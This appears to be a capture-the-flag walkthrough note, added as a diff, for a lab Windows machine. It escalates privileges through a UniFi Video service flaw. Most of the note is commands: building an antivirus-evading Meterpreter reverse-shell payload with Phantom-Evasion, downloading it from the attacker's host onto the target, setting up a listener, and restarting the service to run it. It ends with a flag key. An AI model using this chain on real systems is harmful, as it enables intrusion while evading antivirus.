@@ -1,0 +1,45 @@
+#10.10.10.104
+--------------
+#after logged into Web powershell -->  https://10.10.10.104/remote
+
+#found one file --> unifivideo
+#this is an service and it has an vulnerability
+>>>https://www.exploit-db.com/exploits/43390
+#FOllow the exploit
+#create one payload named 'taskkill.exe'
+#using phantom-Evasion for encoding payload because windows server has 'Windows Defender'
+#phantom evasion location (/root/Downloads/Scripts/Phantom-Evasion-master/)
+python phantom-evasion.py  
+
+------------------------------------------
+#Inside phantom
+#select:- [1] Windows Module
+#select:- [1]  Shellcode Injection
+#select:- [9]  Windows Shellcode Injection Process inject NoDirectCall GPA/GMH 
+#select:- [1] Msfvenom
+#use payload:-  windows/meterpreter/reverse_tcp
+#lhost:- 10.10.14.181
+#lport:- 4444
+#select Encoding type:- [4] x86/xor_dynamic + Triple Multibyte-key xor
+#filename:- taskkill
+#Add multiple processes behaviour?(y/n): y
+#Insert number of decoy processes (integer between 1-3): 2
+#Strip executable? (y/n):y
+#Sign executable? (y/n):n
+------------------------------------------
+
+#payload created 'taskkill.exe' inside '/root/Downloads/Scripts/Phantom-Evasion-master/' folder
+#upload this inside 'C:\ProgramData\unifi-video\'
+Invoke-WebRequest -OutFile C:\ProgramData\unifi-video\taskkill.exe http://10.10.14.181/taskkill.exe
+
+#start msfconsole as listner
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+#restart service to execute the 'taskkill.exe' on server
+restart-service -Name "Ubiquiti Unifi Video"
+
+
+#key
+CF559C6C121F683BF3E56891E80641B1
+
